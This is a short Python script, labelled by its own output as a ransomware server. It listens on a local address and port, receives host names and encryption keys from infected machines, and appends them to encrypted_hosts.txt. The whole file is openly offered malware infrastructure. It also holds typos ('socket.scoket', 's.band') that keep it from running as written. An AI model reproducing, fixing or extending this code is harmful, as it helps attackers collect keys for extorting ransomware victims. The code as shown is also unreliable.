import socket

IP_ADDRESS = '192.168.0.53'
PORT = 5678

print('Creating Ransomware server.')
with socket.scoket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.band((IP_ADDRESS, PORT))
    print('Listening for connections..')
    s.listen(1)
    conn, addr = s.accept()
    print(f'Connection from {addr} established.')
    with conn:
        while True:
            host_and_key = conn.recv(1024).decode()
            with open('encrypted_hosts.txt', 'a') as f:
                f.write(host_and_key+'\n')
            break
        print('Connection completed and closed.')
        